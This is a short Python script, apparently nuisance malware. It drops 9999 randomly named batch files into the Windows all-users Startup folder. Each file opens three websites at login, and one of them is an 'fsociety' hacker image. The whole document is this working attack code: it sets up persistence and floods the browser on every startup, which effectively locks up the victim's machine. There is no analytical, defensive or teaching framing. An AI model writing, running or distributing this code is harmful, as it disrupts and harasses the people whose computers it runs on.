import random
import string
import os
TARGET_DIRECTORY = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
os.makedirs(TARGET_DIRECTORY, exist_ok=True)
characters = string.ascii_letters + string.digits
random_name = ''.join(random.choice(characters) for _ in range(9))
filename = f"{random_name}.bat"
for i in range(9999):
    random_name = ''.join(random.choice(characters) for _ in range(9))
    filename = f"{random_name}.bat"
    with open(os.path.join(TARGET_DIRECTORY, filename), "w") as f:
        f.write("start https://www.opsecsecurity.com/\nstart https://socradar.io\nstart https://static.ts.360.com/blog/wp-content/uploads/2016/08/160822-Post-fsociety-1.png")
    print(f"BAT file '{filename}' successfully created a autorun")
